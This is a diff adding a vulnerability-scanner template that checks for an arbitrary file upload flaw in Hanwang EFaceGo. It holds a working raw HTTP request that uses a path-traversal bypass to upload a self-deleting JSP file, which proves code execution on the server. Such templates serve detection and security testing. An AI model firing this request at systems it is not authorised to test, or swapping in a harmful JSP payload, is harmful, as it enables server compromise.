@@ -1,0 +1,35 @@
+id: hanwang-upload-arbitrary-file
+
+info:
+  name: Hanwang EFaceGo Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for arbitrary file upload vulnerability in Hanwang EFaceGo's upload.do endpoint.
+    Exploitation allows attackers to upload files to the server, potentially leading to remote code execution.
+  tags: hanwang,efacego,file-upload,vulnerability
+
+http:
+  - raw:
+      - |
+        POST /manage/intercom/..%3B/..%3B/manage/resourceUpload/upload.do HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryabcxyzqw
+
+        ------WebKitFormBoundaryabcxyzqw
+        Content-Disposition: form-data; name="file"; filename="testaa.jsp"
+        Content-Type: image/jpeg
+
+        <% out.println("asdfqwerzxcvbnmlkjhgtyuipoiuytre"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryabcxyzqw--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "asdfqwerzxcvbnmlkjhgtyuipoiuytre"
+      - type: status
+        status:
+          - 200
